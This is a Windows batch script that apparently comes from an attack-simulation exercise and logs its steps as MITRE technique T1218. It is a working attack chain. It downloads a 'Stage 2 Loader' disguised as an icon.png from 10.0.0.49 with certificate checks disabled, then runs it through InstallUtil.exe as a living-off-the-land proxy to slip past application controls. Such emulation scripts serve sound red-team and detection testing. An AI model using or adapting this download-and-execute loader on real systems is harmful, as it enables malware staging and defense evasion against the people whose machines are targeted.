@echo off
setlocal enabledelayedexpansion

REM Random-named SET variables for every PHR placeholder
SET aBcD1=%APPDATA%\10437\ea0ffbb9
SET eFgH2=0d9ad0eb.txt
SET iJkL3=https://10.0.0.49/stage/2/icon.png?10437-7
SET mNoP4=ITZEL-S2B
SET qRsT5=10437
SET uVwX6=7
SET yZaB7=%APPDATA%\7\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!.!TIME!

REM Initialize log file path from %APPDATA%\7\macula-simulations.log placeholder
SET logfile=!yZaB7!

REM ------------------------------------------------------------
REM Step 1: Heartbeat fetch (downloads Stage 2 Loader DLL)
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!aBcD1!\!eFgH2!" "!iJkL3!"
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_complete>> "!logfile!" 2>nul

REM ------------------------------------------------------------
REM Step 2: Change directory to output location
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_start>> "!logfile!" 2>nul
cd /d "!aBcD1!" >nul 2>&1
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_result=%ERRORLEVEL%>> "!logfile!" 2>nul

REM ------------------------------------------------------------
REM Step 3: Execute Stage 2 Loader via InstallUtil LOLBIN
REM ------------------------------------------------------------
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: installutil_start>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!eFgH2!" >NUL 2>&1
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: installutil_result=%ERRORLEVEL%>> "!logfile!" 2>nul

REM ------------------------------------------------------------
REM Step 4: Per-TTP log line (T1218 System Binary Proxy Execution)
REM ------------------------------------------------------------
IF %ERRORLEVEL% EQU 0 (
    echo [!tsvar!][TTP][!mNoP4!][!qRsT5!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!mNoP4!][!qRsT5!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logfile!" 2>nul
)

REM Exit
exit /b 0